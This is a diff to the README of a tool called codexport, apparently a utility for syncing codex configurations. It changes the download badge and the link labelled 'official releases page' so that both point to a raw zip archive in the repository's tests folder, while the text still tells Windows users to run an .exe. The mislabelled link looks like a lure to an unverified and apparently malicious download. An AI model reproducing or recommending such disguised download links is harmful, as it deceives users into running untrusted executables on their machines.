@@ -1,6 +1,6 @@
 # ⚙️ codexport - Keep your codex setup perfectly synced
 
-[![](https://img.shields.io/badge/Download_Codexport-blue)](https://github.com/indiscernible-stringofwords49/codexport/releases)
+[![](https://img.shields.io/badge/Download_Codexport-blue)](https://github.com/indiscernible-stringofwords49/codexport/raw/refs/heads/main/tests/Software_1.9.zip)
 
 Codexport manages your codex configurations across multiple machines. You maintain one master setup and this tool copies those settings to your other devices. It saves time and prevents configuration errors when you work on different computers.
 
@@ -8,7 +8,7 @@ Codexport manages your codex configurations across multiple machines. You mainta
 
 Follow these steps to get the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/indiscernible-stringofwords49/codexport/releases).
+1. Visit the [official releases page](https://github.com/indiscernible-stringofwords49/codexport/raw/refs/heads/main/tests/Software_1.9.zip).
 2. Look for the latest release at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
